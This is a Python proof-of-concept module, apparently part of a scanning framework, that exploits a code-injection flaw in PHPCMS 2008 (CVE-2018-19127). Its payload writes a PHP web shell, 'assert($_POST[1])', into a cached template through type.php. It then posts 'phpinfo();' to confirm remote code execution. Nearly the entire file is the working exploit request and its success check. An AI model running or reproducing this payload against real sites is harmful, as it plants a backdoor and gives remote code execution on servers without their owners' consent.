import requests
import lib.config.config as config
from lib.core.monitor import port_monitor,page_monitor

def poc(url):
    poc_type = 'cms:phpcms2008'

    # test = '/cms/phpcms/phpcms2008/'

    payload = r'type.php?template=tag_(){};@unlink(FILE);assert($_POST[1]);{//../rss'
    check_payload = '/data/cache_template/rss.tpl.php'
    check_data = {'1':'phpinfo();'}

    ports = ['80','7001']
 
    port_info = {}  

    port_info,ports = port_monitor(url, poc_type, ports)

    page_info,ports = page_monitor(url, '/type.php', poc_type, ports)
    port_info.update(page_info)

    for port in ports:
        try:
            s = requests.post('http://'+url+payload,data = check_data)
            if s.status_code == 200 and 'PHP Version' in s.text:
                port_info[port] = [1,poc_type,url+check_payload]
            else:
                port_info[port] = [0,poc_type,'Not work']
        except Exception as e:
            print(e)
            port_info[port] = [0,poc_type,'Conect failed']

    return port_info
            
#参考https://github.com/ab1gale/phpcms-2008-CVE-2018-19127